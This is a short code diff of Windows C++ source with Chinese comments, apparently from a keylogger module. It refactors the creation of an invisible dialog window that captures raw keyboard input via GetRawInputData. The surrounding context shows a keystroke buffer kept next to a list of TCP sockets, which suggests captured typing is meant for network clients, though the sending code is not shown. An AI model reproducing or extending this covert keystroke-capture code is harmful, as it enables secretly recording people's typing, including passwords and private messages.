@@ -5,7 +5,7 @@
 // 此关键段用来保护 socket vector
 static CRITICAL_SECTION gCs;
 static Keybd gKbd; // 初始化类
-static HWND s_hWnd = NULL; // 窗口句柄
+static HWND s_hWnd = NULL; // 用来接收原始设备输入的隐形窗口句柄
 static std::vector<TcpSocket*> gSockets; // socket 列表
 static std::vector<char> gBuffer; // 键盘数据缓冲区
 
@@ -69,13 +69,20 @@ void Keybd::createDialogByNewThread()
 DWORD Keybd::threadProc(LPVOID)
 {
 	// 创建一个不可见的窗口来处理win32事件
-	WORD tempMem[1024];
-	LPDLGTEMPLATEA temp = (LPDLGTEMPLATEA)tempMem;
-	temp->style = WS_CAPTION;
-	temp->dwExtendedStyle = 0;
-	temp->x = 0; temp->y = 0;
-	temp->cx = 0; temp->cy = 0;
-	int ret = DialogBoxIndirectParamA(NULL, temp, NULL, keybdWndProc, (LPARAM)NULL);
+	// 先创建对话框模板DLGTMPLATEA
+	HGLOBAL hglb = GlobalAlloc(GMEM_ZEROINIT, 1024);
+	if (!hglb) {
+		OutputDebugStringA("failed to alloc DLGTMPLATEA\r\n");
+		return false;
+	}
+	LPDLGTEMPLATEA lpdt = (LPDLGTEMPLATEA)GlobalLock(hglb);
+	lpdt->style = WS_CAPTION;
+	lpdt->dwExtendedStyle = 0;
+	lpdt->x = 0; lpdt->y = 0;
+	lpdt->cx = 0; lpdt->cy = 0;
+	GlobalUnlock(hglb);
+	// 创建隐形对话框
+	int ret = DialogBoxIndirectParamA(NULL, lpdt, NULL, keybdWndProc, NULL);
 
 	if (ret == -1) {
 		OutputDebugStringA("Failed to create dialog box for keybd\r\n");
@@ -139,7 +146,8 @@ BOOL Keybd::getKeybdData(LPARAM lParam) {
 	UINT uiSize = sizeof(rawinputData);
 
 	// 获取原始输入数据的大小
-	::GetRawInputData((HRAWINPUT)lParam, RID_INPUT, &rawinputData, &uiSize, sizeof(RAWINPUTHEADER));
+	::GetRawInputData((HRAWINPUT)lParam, RID_INPUT, 
+		&rawinputData, &uiSize, sizeof(RAWINPUTHEADER));
 	if (RIM_TYPEKEYBOARD == rawinputData.header.dwType)
 	{
 		// WM_KEYDOWN --> 普通按键    WM_SYSKEYDOWN --> 系统按键(指的是ALT)  
